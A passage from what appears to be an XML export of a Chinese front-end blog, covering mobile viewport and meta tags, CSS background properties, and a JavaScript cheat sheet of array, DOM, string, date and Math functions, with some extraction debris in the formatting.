content="initial-scale=1">```123456789101112&amp;emsp;&amp;emsp;这句代码也能达到和前一句代码一样的效果，也可以把当前的的viewport变为 ideal viewport。&amp;emsp;&amp;emsp;呵呵，傻眼了吧，因为从理论上来讲，这句代码的作用只是不对当前的页面进行缩放，也就是页面本该是多大就是多大。那为什么会有 width=device-width 的效果呢？&amp;emsp;&amp;emsp;要想清楚这件事情，首先你得弄明白这个缩放是相对于什么来缩放的，因为这里的缩放值是1，也就是没缩放，但却达到了 ideal viewport 的效果，所以，那答案就只有一个了，缩放是相对于 ideal viewport来进行缩放的，当对ideal viewport进行100%的缩放，也就是缩放值为1的时候，不就得到了 ideal viewport吗？事实证明，的确是这样的。下图是各大移动端的浏览器当设置了```&lt;meta name=&quot;viewport&quot; content=&quot;initial-scale=1&quot;&gt;``` 后是否能把当前的viewport宽度变成 ideal viewport 的宽度的测试结果.[![11](http://www.npm8.com/wp-content/uploads/2015/09/112-660x118.png)](http://www.npm8.com/wp-content/uploads/2015/09/112.png)&amp;emsp;&amp;emsp;测试结果表明 initial-scale=1 也能把当前的viewport宽度变成 ideal viewport 的宽度，但这次轮到了windows phone 上的IE 无论是竖屏还是横屏都把宽度设为竖屏时ideal viewport的宽度。但这点小瑕疵已经无关紧要了。&amp;emsp;&amp;emsp;但如果width 和 initial-scale=1同时出现，并且还出现了冲突呢？比如：```&lt;meta name=&quot;viewport&quot; content=&quot;width=400, initial-scale=1&quot;&gt;&emsp;&emsp;width=400表示把当前viewport的宽度设为400px，initial-scale=1则表示把当前viewport的宽度设为ideal viewport的宽度，那么浏览器到底该服从哪个命令呢？是书写顺序在后面的那个吗？不是。当遇到这种情况时，浏览器会取它们两个中较大的那个值。例如，当width=400，ideal viewport的宽度为320时，取的是400；当width=400， ideal viewport的宽度为480时，取的是ideal viewport的宽度。（ps:在uc9浏览器中，当initial-scale=1时，无论width属性的值为多少，此时viewport的宽度永远都是ideal viewport的宽度）&emsp;&emsp;最后，总结一下，要把当前的viewport宽度设为ideal viewport的宽度，既可以设置 width=device-width，也可以设置 initial-scale=1，但这两者各有一个小缺陷，就是iphone、ipad以及IE 会横竖屏不分，通通以竖屏的ideal viewport宽度为准。所以，最完美的写法应该是，两者都写上去，这样就 initial-scale=1 解决了 iphone、ipad的毛病，width=device-width则解决了IE的毛病：name="viewport" content="width=device-width, initial-scale=1">```123456789### **六、关于meta viewport的更多知识****1、关于缩放以及initial-scale的默认值**&amp;emsp;&amp;emsp;首先我们先来讨论一下缩放的问题，前面已经提到过，缩放是相对于ideal viewport来缩放的，缩放值越大，当前viewport的宽度就会越小，反之亦然。例如在iphone中，ideal viewport的宽度是320px，如果我们设置 initial-scale=2 ，此时viewport的宽度会变为只有160px了，这也好理解，放大了一倍嘛，就是原来1px的东西变成2px了，但是1px变为2px并不是把原来的320px变为640px了，而是在实际宽度不变的情况下，1px变得跟原来的2px的长度一样了，所以放大2倍后原来需要320px才能填满的宽度现在只需要160px就做到了。因此，我们可以得出一个公式：```visual viewport宽度 = ideal viewport宽度 / 当前缩放值= ideal viewport宽度 / visual viewport宽度```12345678910ps: visual viewport的宽度指的是浏览器可视区域的宽度。&amp;emsp;&amp;emsp;大多数浏览器都符合这个理论，但是安卓上的原生浏览器以及IE有些问题。安卓自带的webkit浏览器只有在 initial-scale = 1 以及没有设置width属性时才是表现正常的，也就相当于这理论在它身上基本没用；而IE则根本不甩initial-scale这个属性，无论你给他设置什么，initial-scale表现出来的效果永远是1。&amp;emsp;&amp;emsp;好了，现在再来说下initial-scale的默认值问题，就是不写这个属性的时候，它的默认值会是多少呢？很显然不会是1，因为当 initial-scale = 1 时，当前的layout viewport宽度会被设为 ideal viewport的宽度，但前面说了，各浏览器默认的 layout viewport宽度一般都是980啊，1024啊，800啊等等这些个值，没有一开始就是 ideal viewport的宽度的，所以 initial-scale的默认值肯定不是1。安卓设备上的initial-scale默认值好像没有方法能够得到，或者就是干脆它就没有默认值，一定要你显示的写出来这个东西才会起作用，我们不管它了，这里我们重点说一下iphone和ipad上的initial-scale默认值。&amp;emsp;&amp;emsp;根据测试，我们可以在iphone和ipad上得到一个结论，就是无论你给layout viewpor设置的宽度是多少，而又没有指定初始的缩放值的话，那么iphone和ipad会自动计算initial-scale这个值，以保证当前layout viewport的宽度在缩放后就是浏览器可视区域的宽度，也就是说不会出现横向滚动条。比如说，在iphone上，我们不设置任何的viewport meta标签，此时layout viewport的宽度为980px，但我们可以看到浏览器并没有出现横向滚动条，浏览器默认的把页面缩小了。根据上面的公式```当前缩放值 = ideal viewport宽度 / visual viewport宽度，我们可以得出：当前缩放值 = 320 / 980&emsp;&emsp;也就是当前的initial-scale默认值应该是 0.33这样子。当你指定了initial-scale的值后，这个默认值就不起作用了。&emsp;&emsp;总之记住这个结论就行了：在iphone和ipad上，无论你给viewport设的宽的是多少，如果没有指定默认的缩放值，则iphone和ipad会自动计算这个缩放值，以达到当前页面不会出现横向滚动条(或者说viewport的宽度就是屏幕的宽度)的目的。2、动态改变meta viewport标签第一种方法可以使用document.write来动态输出meta viewport标签，例如：name="viewport" content="width=device-width,initial-scale=1">')```1234567第二种方法通过setAttribute来改变```&lt;meta id=&quot;testViewport&quot; name=&quot;viewport&quot; content=&quot;width = 380&quot;&gt;1234&lt;script&gt;var mvp = document.getElementById('testViewport');mvp.setAttribute('content','width=480');&lt;/script&gt;&emsp;&emsp;12345678&lt;meta name="viewport" content="width=device-width"&gt;&lt;script type="text/javascript"&gt;alert(document.documentElement.clientWidth); //弹出600，正常情况应该弹出320&lt;/script&gt;&lt;meta name="viewport" content="width=600"&gt;&lt;script type="text/javascript"&gt;alert(document.documentElement.clientWidth); //弹出320，正常情况应该弹出600&lt;/script&gt;&emsp;&emsp;测试的手机ideal viewport 宽度为320px，第一次弹出的值是600,但这个值应该是第行meta标签的结果啊，然后第二次弹出的值是320，这才是第一行meta标签所达到的效果啊，所以在安卓2.3(或许是所有2.x版本中)的自带浏览器中，对meta viewport标签进行覆盖或更改，会出现让人非常迷糊的结果。七、结语说了那么多废话，最后还是有必要总结一点有用的出来。&emsp;&emsp;首先如果不设置meta viewport标签，那么移动设备上浏览器默认的宽度值为800px，980px，1024px等这些，总之是大于屏幕宽度的。这里的宽度所用的单位px都是指css中的px，它跟代表实际屏幕物理像素的px不是一回事。&emsp;&emsp;第二、每个移动设备浏览器中都有一个理想的宽度，这个理想的宽度是指css中的宽度，跟设备的物理宽度没有关系，在css中，这个宽度就相当于100%的所代表的那个宽度。我们可以用meta标签把viewport的宽度设为那个理想的宽度，如果不知道这个设备的理想宽度是多少，那么用device-width这个特殊值就行了，同时initial-scale=1也有把viewport的宽度设为理想宽度的作用。所以，我们可以使用&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;来得到一个理想的viewport（也就是前面说的ideal viewport）。&emsp;&emsp;为什么需要有理想的viewport呢？比如一个分辨率为320x480的手机理想viewport的宽度是320px，而另一个屏幕尺寸相同但分辨率为640x960的手机的理想viewport宽度也是为320px，那为什么分辨率大的这个手机的理想宽度要跟分辨率小的那个手机的理想宽度一样呢？这是因为，只有这样才能保证同样的网站在不同分辨率的设备上看起来都是一样或差不多的。实际上，现在市面上虽然有那么多不同种类不同品牌不同分辨率的手机，但它们的理想viewport宽度归纳起来无非也就 320、360、384、400等几种，都是非常接近的，理想宽度的相近也就意味着我们针对某个设备的理想viewport而做出的网站，在其他设备上的表现也不会相差非常多甚至是表现一样的。]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>移动前端 viewport</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动端各种meta解释说明]]></title>
    <url>%2F2015%2F09%2F29%2F%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%90%84%E7%A7%8Dmeta%E8%A7%A3%E9%87%8A%E8%AF%B4%E6%98%8E%2F</url>
    <content type="text"><![CDATA[一、name="viewport" content="width=device-width,height=device-height,initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">```12345678910111213141516171.name=&quot;viewport&quot; //设置视口（网页可绘制的区域）2.width=device-width //应用程序的宽度和屏幕的宽度是一样的3.height=device-height //应用程序的高度和屏幕的高是一样的4.initial-scale=1.0 //应用程序启动时候的缩放尺度（1.0表示不缩放）5.minimum-scale=1.0 //用户可以缩放到的最小尺度（1.0表示不缩放）6.maximum-scale=1.0 //用户可以放大到的最大尺度（1.0表示不缩放）7.user-scalable=no //用户是否可以通过他的手势来缩放整个应用程序，使应用程序的尺度发生一个改变（yes/no）&amp;nbsp;二、```&lt;meta name=&quot;viewport&quot; content=&quot;target-densitydpi=device-dpi, width=480px, user-scalable=no&quot;&gt;target-densitydpi=device-dpi //指定屏幕像素密度DPI,device-dpi 为设备原本的DPI值,不会有任何缩放.( dpi是单位,一般指每英寸的像素)&nbsp;三、name="apple-mobile-web-app-capable" content="yes">```123456789101112//说明：网站开启对web app程序的支持1.apple-mobile-web-app-capable2.content=&quot;yes&quot; //是否开启（开启）&amp;nbsp;四、```&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;``` //强制使用ie最新内核模式渲染&amp;nbsp;五、```&lt;meta name=&quot;format-detection&quot; content=&quot;telephone=no&quot;&gt;当该 HTML 页面在手机上浏览时，该标签用于指定是否将网页内容中的手机号码显示为拨号的超链接在 iPhone 上默认值是：name="format-detection" content="telephone=yes"/>```123如果你不希望手机自动将网页中的电话号码显示为拨号的超链接，那么可以这样写：```&lt;meta name=&quot;format-detection&quot; content=&quot;telephone=no&quot;/&gt;&nbsp;六、content="email=no" name="format-detection"。123&amp;nbsp;七、```&lt;meta name=&quot;apple-mobile-web-app-status-bar-style&quot; content=&quot;black&quot; /&gt;//在web app应用下状态条（屏幕顶部条）的颜色；默认值为default（白色），可以定为black（黑色）和black-translucent（灰色半透明）。注意：若值为“black-translucent”将会占据页面px位置，浮在页面上方（会覆盖页面20px高度–iphone4和itouch4的Retina屏幕为40px）。&nbsp;八、name="apple-touch-fullscreen" content="yes">```link123&amp;nbsp;九、```&lt;meta name=&quot;apple-mobile-web-app-capable&quot; content=&quot;yes&quot; /&gt;//这meta的作用就是删除默认的苹果工具栏和菜单栏。content有两个值”yes”和”no”,当我们需要显示工具栏和菜单栏时，这个行meta就不用加了，默认就是显示。&nbsp;十、苹果web app其他设置：1).rel="apple-touch-icon-precomposed" href="iphone_milanoo.png"link123456说明：这个link就是设置web app的放置主屏幕上icon文件路径。使用：该路径需要注意的就是放到将网站的文档根目录下但不是服务器的文档的根目录。图片尺寸可以设定为57*57（px）或者Retina可以定为114*114（px），ipad尺寸为72*72（px）。2).```&lt;link rel=&quot;apple-touch-startup-image&quot; href=&quot;milanoo_startup.png&quot; /&gt;说明：这个link就是设置启动时候的界面（图片五），放置的路劲和上面类似。使用：该路径需要注意的就是放到将网站的文档根目录下但不是服务器的文档的根目录。官方规定启动界面的尺寸必须为 320*640（px），原本以为Retina屏幕可以支持双倍，但是不支持，图片显示不出来。&nbsp;十一、&lt;META NAME=&quot;MobileOptimized&quot; CONTENT=&quot;240&quot;&gt;//浏览器不会自动调整文件的大小,也就是说是固定大小,不会随着浏览器拉伸缩放。]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>移动端 meta</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网页背景图固定不动，不跟随滚动条滚动]]></title>
    <url>%2F2015%2F09%2F28%2F%E7%BD%91%E9%A1%B5%E8%83%8C%E6%99%AF%E5%9B%BE%E5%9B%BA%E5%AE%9A%E4%B8%8D%E5%8A%A8%EF%BC%8C%E4%B8%8D%E8%B7%9F%E9%9A%8F%E6%BB%9A%E5%8A%A8%E6%9D%A1%E6%BB%9A%E5%8A%A8%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;我们在做网页的时候，当背景是一张完整的图片，不动让其跟随滚动条滚动，怎么办？下面详细讲解一下。CSS代码示例-背景颜色属性(background-color):123456789&lt;html&gt;&lt;head&gt;&lt;title&gt;背景颜色 background-color&lt;/title&gt;&lt;style type="text/css"&gt; body &#123;background-color:#99FF00;&#125; &lt;/style&gt; &lt;/head&gt;&lt;body&gt;&lt;p&gt;这个HTML使用了CSS的background-color属性，将HTML的背景颜色变成翠绿色。&lt;p&gt;&lt;/body&gt;&lt;/html&gt;演示结果：这个HTML使用了CSS的background-color属性，将HTML的背景颜色变成翠绿色。CSS代码示例-背景图片属性(background-image):1&lt;html&gt;&lt;head&gt; &lt;title&gt;背景图片background-image&lt;/title&gt;&lt;/head&gt; &lt;body style="background-image:url(../images/css_tutorials/background.jpg)"&gt; &lt;p&gt;这个HTML使用了CSS的background-image属性，设置了背景图片。&lt;p&gt; &lt;/body&gt;&lt;/html&gt;演示结果：这个HTML使用了CSS的background-image属性，设置了背景图片。CSS代码示例- 背景重复属性(background-repeat)：12345678&lt;html&gt;&lt;head&gt;&lt;title&gt;背景重复 background-repeat&lt;/title&gt;&lt;style type="text/css"&gt; body &#123;background-image:url(../images/css_tutorials/background.jpg); background-repeat:repeat-y&#125; &lt;/style&gt; &lt;/head&gt;&lt;body&gt;&lt;p&gt;这个HTML使用了CSS的background-repeat属性，使背景图片竖向重复。&lt;p&gt;&lt;p&gt;常用的background-repeat的属性值有: repeat-x(横向重复)，repeat-x(横向重复), no-repeat(不重复)。&lt;/p&gt;&lt;p&gt;background-repeat属性要和background-image一起用。&lt;/p&gt;&lt;/body&gt; &lt;/html&gt;演示结果：&emsp;&emsp;这个HTML使用了CSS的background-repeat属性，使背景图片竖向重复。 常用的background-repeat的属性值有: repeat-x(横向重复)，repeat-x(横向重复), no-repeat(不重复)。 background-repeat属性要和background-image一起用。CSS代码示例-背景附着属性(background-attachment)-[背景图固定不动，不跟随滚动条滚动]：12345678910&lt;html&gt;&lt;head&gt;&lt;title&gt;背景附着属性 background-attachment&lt;/title&gt;&lt;style type="text/css"&gt;body &#123;background-image:url(../images/css_tutorials/background.jpg); background-repeat:no-repeat; background-attachment:fixed&#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;这个HTML使用了CSS的background-attachment属性，将背景图片固定，不随内容滚动而滚动。&lt;p&gt;&lt;p&gt;背景附着(background-attachment)属性有两个值。一个是scroll，表示随内容滚动而动；一个是fixed，表示固定不动，不受内容滚动影响。缺省值是scroll。&lt;/p&gt;&lt;p&gt;background-attachment要和background-image一起用。&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;演示结果：这个HTML使用了CSS的 background-attachment 属性，将背景图片固定，不随内容滚动而滚动。背景附着(background-attachment)属性有两个值。一个是scroll，表示随内容滚动而动；一个是fixed，表示固定不动，不受内容滚动影响。缺省值是scroll。background-attachment要和background-image一起用。这个HTML使用了CSS的background-attachment属性，将背景图片固定，不随内容滚动而滚动。背景附着(background-attachment)属性有两个值。一个是scroll，表示随内容滚动而动；一个是fixed，表示固定不动，不受内容滚动影响。缺省值是scroll。CSS代码示例-背景位置属性(background-position)：123456789&lt;html&gt;&lt;head&gt;&lt;title&gt;背景位置属性 background-position&lt;/title&gt;&lt;style type="text/css"&gt;body &#123;background-image:url(../images/css_tutorials/background.jpg);background-repeat:no-repeat;background-position:20px 60px&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;这个HTML使用了CSS的background-position属性。这个属性和background-image属性连在一起使用，决定了背景图片的最初位置。&lt;/p&gt;&lt;p&gt;上面的代码表示背景图片的初始位置距离网页最左面20px，距离网页最上面60px。&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;演示结果：&emsp;&emsp;这个HTML使用了CSS的background-position属性。这个属性和background-image属性连在一起使用，决定了背景图片的最初位置。上面的代码表示背景图片的初始位置距离网页最左面20px，距离网页最上面60px。CSS代码示例-背景属性(background)：1234567&lt;html&gt;&lt;head&gt;&lt;title&gt;背景属性 background&lt;/title&gt;&lt;style type="text/css"&gt;body&#123;background:#99FF00 url(../images/css_tutorials/background.jpg) no-repeat fixed 40px 100px&#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;这个属性是设置背景相关属性的一种快捷的综合写法，包括background-color, background-image, background-repeat, backgroundattachment, background-position。&lt;/p&gt;&lt;p&gt;这个HTML所用的背景属性表示，网页的背景颜色是翠绿色，背景是background.jpg图片，图片不重复显示，背景图片不随内容滚动而动，背景图片距离网页最左面40px，距离网页最上面100px。&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;演示结果：&emsp;&emsp;这个属性是设置背景相关属性的一种快捷的综合写法， 包括background-color, background-image, background-repeat, backgroundattachment, background-position。&emsp;&emsp;这个HTML所用的背景属性表示，网页的背景颜色是翠绿色，背景图片是background.jpg图片，背景图片不重复显示，背景图片不随内容滚动而动，背景图片距离网页最左面40px，距离网页最上面100px。这个属性是设置背景相关属性的一种快捷的综合写法， 包括background-color, background-image, background-repeat, backgroundattachment, background-position。&nbsp;]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>不跟随滚动条滚动</tag>
        <tag>背景图固定</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js基本功能大全]]></title>
    <url>%2F2015%2F09%2F28%2Fjs%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD%E5%A4%A7%E5%85%A8%2F</url>
    <content type="text"><![CDATA[1.javascript的数组API：12345678910111213141516171819202122232425262728293031323334353637383940//定义数组var pageIds = new Array();pageIds.push('A');数组长度pageIds.length;//shift：删除原数组第一项，并返回删除元素的值；如果数组为空则返回undefinedvar a = [1,2,3,4,5];var b = a.shift(); //a：[2,3,4,5] b：1//unshift：将参数添加到原数组开头，并返回数组的长度var a = [1,2,3,4,5];var b = a.unshift(-2,-1); //a：[-2,-1,1,2,3,4,5] b：7//注：在IE6.0下测试返回值总为undefined，FF2.0下测试返回值为7，所以这个方法的返回值不可靠，需要用返回值时可用splice代替本方法来使用。//pop：删除原数组最后一项，并返回删除元素的值；如果数组为空则返回undefinedvar a = [1,2,3,4,5];var b = a.pop(); //a：[1,2,3,4] b：5//push：将参数添加到原数组末尾，并返回数组的长度var a = [1,2,3,4,5];var b = a.push(6,7); //a：[1,2,3,4,5,6,7] b：7//concat：返回一个新数组，是将参数添加到原数组中构成的var a = [1,2,3,4,5];var b = a.concat(6,7); //a：[1,2,3,4,5] b：[1,2,3,4,5,6,7]//splice(start,deleteCount,val1,val2,)：从start位置开始删除deleteCount项，并从该位置起插入val1,val2,var a = [1,2,3,4,5];var b = a.splice(2,2,7,8,9); //a：[1,2,7,8,9,5] b：[3,4]var b = a.splice(0,1); //同shifta.splice(0,0,-2,-1); var b = a.length; //同unshiftvar b = a.splice(a.length-1,1); //同popa.splice(a.length,0,6,7); var b = a.length; //同push//reverse：将数组反序var a = [1,2,3,4,5];var b = a.reverse(); //a：[5,4,3,2,1] b：[5,4,3,2,1]//sort(orderfunction)：按指定的参数对数组进行排序var a = [1,2,3,4,5];var b = a.sort(); //a：[1,2,3,4,5] b：[1,2,3,4,5]//slice(start,end)：返回从原数组中指定开始下标到结束下标之间的项组成的新数组var a = [1,2,3,4,5];var b = a.slice(2,5); //a：[1,2,3,4,5] b：[3,4,5]//join(separator)：将数组的元素组起一个字符串，以separator为分隔符，省略的话则用默认用逗号为分隔符var a = [1,2,3,4,5];var b = a.join("|"); //a：[1,2,3,4,5] b："1|2|3|4|5"&nbsp;2.dom最常用API：1234567891011121314151617181920212223242526272829//document方法：getElementById(id) Node 返回指定结点的引用getElementsByTagName(name) NodeList 返回文档中所有匹配的元素的集合createElement(name) Node NodecreateTextNode(text) Node 创建一个纯文本结点ownerDocument Document 指向这个节点所属的文档documentElement Node 返回html节点document.body Node 返回body节点//element方法：getAttribute(attributeName) String 返回指定属性的值setAttribute(attributeName,value) String 给属性赋值removeAttribute(attributeName) String 移除指定属性和它的值getElementsByTagName(name) NodeList 返回结点内所有匹配的元素的集合//node方法：appendChild(child) Node 给指定结点添加一个新的子结点removeChild(child) Node 移除指定结点的子结点replaceChild(newChild,oldChild) Node 替换指定结点的子结点insertBefore(newChild,refChild) Node 在同一层级的结点前面插入新结点hasChildNodes() Boolean 如果结点有子结点则返回true//node属性：nodeName String 以字符串的格式存放结点的名称nodeType String 以整型数据格式存放结点的类型nodeValue String 以可用的格式存放结点的值parentNode Node 指向结点的父结点的引用childNodes NodeList 指向子结点的引用的集合firstChild Node 指向子结点结合中的第一个子结点的引用lastChild Node 指向子结点结合中的最后一个子结点的引用previousSibling Node 指向前一个兄弟节点；如果这个节点就是兄弟节点，那么该值为nullnextSibling Node 指向后一个兄弟节点；如果这个节点就是兄弟节点，那么该值为null&nbsp;3.网上搜藏的一个map对象:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132function HashMap()&#123;/** Map 大小 **/var size = 0;/** 对象 **/var entry = new Object();/** 存 **/this.put = function (key , value)&#123;if(!this.containsKey(key))&#123;size ++ ;&#125;entry[key] = value;&#125;/** 取 **/this.get = function (key)&#123;return this.containsKey(key) ? entry[key] : null;&#125;/** 删除 **/this.remove = function ( key )&#123;if( this.containsKey(key) &amp;amp;&amp;amp; ( delete entry[key] ) )&#123;size --;&#125;&#125;/** 是否包含 Key **/this.containsKey = function ( key )&#123;return (key in entry);&#125;/** 是否包含 Value **/this.containsValue = function ( value )&#123;for(var prop in entry)&#123;if(entry[prop] == value)&#123;return true;&#125;&#125;return false;&#125;/** 所有 Value **/this.values = function ()&#123;var values = new Array();for(var prop in entry)&#123;values.push(entry[prop]);&#125;return values;&#125;/** 所有 Key **/this.keys = function ()&#123;var keys = new Array();for(var prop in entry)&#123;keys.push(prop);&#125;return keys;&#125;/** Map Size **/this.size = function ()&#123;return size;&#125;/* 清空 */this.clear = function ()&#123;size = 0;entry = new Object();&#125;&#125;var map = new HashMap();/*map.put("A","1");map.put("B","2");map.put("A","5");map.put("C","3");map.put("A","4");*//*alert(map.containsKey("XX"));alert(map.size());alert(map.get("A"));alert(map.get("XX"));map.remove("A");alert(map.size());alert(map.get("A"));*//** 同时也可以把对象作为 Key **//*var arrayKey = new Array("1","2","3","4");var arrayValue = new Array("A","B","C","D");map.put(arrayKey,arrayValue);var value = map.get(arrayKey);for(var i = 0 ; i &lt; value.length ; i++)&#123;//alert(value[i]);&#125;*//** 把对象做为Key时 ，自动调用了该对象的 toString() 方法 其实最终还是以String对象为Key**//** 如果是自定义对象 那自己得重写 toString() 方法 否则 . 就是下面的结果 **/function MyObject(name)&#123;this.name = name;&#125;/**function MyObject(name)&#123;this.name = name;this.toString = function ()&#123;return this.name;&#125;&#125;**/var object1 = new MyObject("小张");var object2 = new MyObject("小名");map.put(object1,"小张");map.put(object2,"小名");alert(map.get(object1));alert(map.get(object2));map.remove("xxxxx");alert(map.size());/** 运行结果 小名 小名 size = 1 **//** 如果改成复写toString()方法的对象 , 效果就完全不一样了 **/&nbsp;4.常用的数字函数:1234567891011121314151617181920212223242526272829303132333435363738394041//·数字型(Number)//1.声明var i = 1;var i = new Number(1);//2.字符串与数字间的转换var i = 1;var str = i.toString(); //结果: "1"var str = new String(i); //结果: "1"i = parseInt(str); //结果: 1i = parseFloat(str); //结果: 1.0//注意: parseInt,parseFloat会把一个类似于"32G"的字符串,强制转换成32//3.判断是否为有效的数字var i = 123; var str = "string";if( typeof i == "number" )&#123; &#125; //true//某些方法(如:parseInt,parseFloat)会返回一个特殊的值NaN(Not a Number)//请注意第2点中的[注意],此方法不完全适合判断一个字符串是否是数字型!!i = parseInt(str);if( isNaN(i) )&#123; &#125;//4.数字型比较//此知识与[字符串比较]相同///5.小数转整数var f = 1.5;var i = Math.round(f); //结果:2 (四舍五入)var i = Math.ceil(f); //结果:2 (返回大于f的最小整数)var i = Math.floor(f); //结果:1 (返回小于f的最大整数)//6.格式化显示数字var i = 3.14159;//格式化为两位小数的浮点数var str = i.toFixed(2); //结果: "3.14"//格式化为五位数字的浮点数(从左到右五位数字,不够补零)var str = i.toPrecision(5); //结果: "3.1415"//7.X进制数字的转换//不是很懂 -.-var i = parseInt("0x1f",16);var i = parseInt(i,10);var i = parseInt("11010011",2);//8.随机数//返回0-1之间的任意小数var rnd = Math.random();//返回0-n之间的任意整数(不包括n)var rnd = Math.floor(Math.random() * n)&nbsp;5.网上搜藏的js堆栈:1234567891011121314151617181920212223242526272829303132333435363738function stack()&#123;if(this.top==undefined)&#123;//初始化堆栈的顶部指针和数据存放域this.top=0;this.unit=new Array();&#125;this.push=function(pushvalue)&#123;//定义压入堆栈的方法this.unit[this.top]=pushvalue;this.top+=1;&#125;this.readAllElements=function()&#123;//定义读取所有数据的方法if(this.top==0)&#123;alert("当前栈空，无法读取数据");return("");&#125;var count=0;var outStr="";for(count=0;count&lt;this.top;count++)&#123;outStr+=this.unit[count]+",";&#125;return(outStr);&#125;this.pop=function()&#123;//定义弹出堆栈的方法if(this.top==0)&#123;alert("当前栈空，无法弹出数据");return("");&#125;var popTo=this.unit[this.top-1];this.top--;return(popTo);/* 从堆栈弹出数据，顶部指针减一，不过这里没有做到资源的释放，也就是说数据仍然存在于this.unit的数组中，只不过无法访问罢了。目前我也没想到好的办法解决。*/&#125;&#125;&nbsp;6.最常用的JavaScript日期函数:123456789101112131415161718192021222324252627282930313233343536//·日期型(Date)//1.声明var myDate = new Date(); //系统当前时间var myDate = new Date(yyyy, mm, dd, hh, mm, ss);var myDate = new Date(yyyy, mm, dd);var myDate = new Date("monthName dd, yyyy hh:mm:ss");var myDate = new Date("monthName dd, yyyy");var myDate = new Date(epochMilliseconds);//2.获取时间的某部份var myDate = new Date();myDate.getYear(); //获取当前年份(2位)myDate.getFullYear(); //获取完整的年份(4位,1970-????)myDate.getMonth(); //获取当前月份(0-11,0代表1月)myDate.getDate(); //获取当前日(1-31)myDate.getDay(); //获取当前星期X(0-6,0代表星期天)myDate.getTime(); //获取当前时间(从1970.1.1开始的毫秒数) 时间戳！！myDate.getHours(); //获取当前小时数(0-23)myDate.getMinutes(); //获取当前分钟数(0-59)myDate.getSeconds(); //获取当前秒数(0-59)myDate.getMilliseconds(); //获取当前毫秒数(0-999)myDate.toLocaleDateString(); //获取当前日期myDate.toLocaleTimeString(); //获取当前时间myDate.toLocaleString( ); //获取日期与时间//3.计算之前或未来的时间var myDate = new Date();myDate.setDate(myDate.getDate() + 10); //当前时间加10天//类似的方法都基本相同,以set开头,具体参考第2点//4.计算两个日期的偏移量var i = daysBetween(beginDate,endDate); //返回天数var i = beginDate.getTimezoneOffset(endDate); //返回分钟数//5.检查有效日期//checkDate() 只允许"mm-dd-yyyy"或"mm/dd/yyyy"两种格式的日期if( checkDate("2006-01-01") )&#123; &#125;//正则表达式(自己写的检查 yyyy-mm-dd, yy-mm-dd, yyyy/mm/dd, yy/mm/dd 四种)var r = /^(\d&#123;2&#125;|\d&#123;4&#125;)[\/-]\d&#123;1,2&#125;[\/-]\d&#123;1,2&#125;$/;if( r.test( myString ) )&#123; &#125;&nbsp;7.最常用字符串函数API:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152//·字符串(String)//1.声明var myString = new String("Every good boy does fine.");var myString = "Every good boy does fine.";//2.字符串连接var myString = "Every " + "good boy " + "does fine.";var myString = "Every "; myString += "good boy does fine.";//3.截取字符串//截取第 6 位开始的字符var myString = "Every good boy does fine.";var section = myString.substring(6); //结果: "good boy does fine."//截取第 0 位开始至第 10 位为止的字符var myString = "Every good boy does fine.";var section = myString.substring(0,10); //结果: "Every good"//截取从第 11 位到倒数第 6 位为止的字符var myString = "Every good boy does fine.";var section = myString.slice(11,-6); //结果: "boy does"//从第 6 位开始截取长度为 4 的字符var myString = "Every good boy does fine.";var section = myString.substr(6,4); //结果: "good"//4.转换大小写var myString = "Hello";var lcString = myString.toLowerCase(); //结果: "hello"var ucString = myString.toUpperCase(); //结果: "HELLO"//5.字符串比较var aString = "Hello!";var bString = new String("Hello!");if( aString == "Hello!" )&#123; &#125; //结果: trueif( aString == bString )&#123; &#125; //结果: trueif( aString === bString )&#123; &#125; //结果: false (两个对象不同,尽管它们的值相同)//6.检索字符串var myString = "hello everybody.";// 如果检索不到会返回-1,检索到的话返回在该串中的起始位置if( myString.indexOf("every") &gt; -1 )&#123; &#125; //结果: true////7.查找替换字符串var myString = "I is your father.";var result = myString.replace("is","am"); //结果: "I am your father."//8.特殊字符://\b : 后退符 \t : 水平制表符//\n : 换行符 \v : 垂直制表符//\f : 分页符 \r : 回车符//\" : 双引号 \' : 单引号//\\ : 反斜杆//9.将字符转换成Unicode编码var myString = "hello";var code = myString.charCodeAt(3); //返回"l"的Unicode编码(整型)var char = String.fromCharCode(66); //返回Unicode为66的字符//10.将字符串转换成URL编码var myString = "hello all";var code = encodeURI(myString); //结果: "hello%20all"var str = decodeURI(code); //结果: "hello all"//相应的还有: encodeURIComponent() decodeURIComponent()&nbsp;8.数学函数:123456789101112131415161718192021222324252627·Math对象Math.abs(num) : 返回num的绝对值Math.acos(num) : 返回num的反余弦值Math.asin(num) : 返回num的反正弦值Math.atan(num) : 返回num的反正切值Math.atan2(y,x) : 返回y除以x的商的反正切值Math.ceil(num) : 返回大于num的最小整数Math.cos(num) : 返回num的余弦值Math.exp(x) : 返回以自然数为底,x次幂的数Math.floor(num) : 返回小于num的最大整数Math.log(num) : 返回num的自然对数Math.max(num1,num2) : 返回num1和num2中较大的一个Math.min(num1,num2) : 返回num1和num2中较小的一个Math.pow(x,y) : 返回x的y次方的值Math.random() : 返回0到1之间的一个随机数Math.round(num) : 返回num四舍五入后的值Math.sin(num) : 返回num的正弦值Math.sqrt(num) : 返回num的平方根Math.tan(num) : 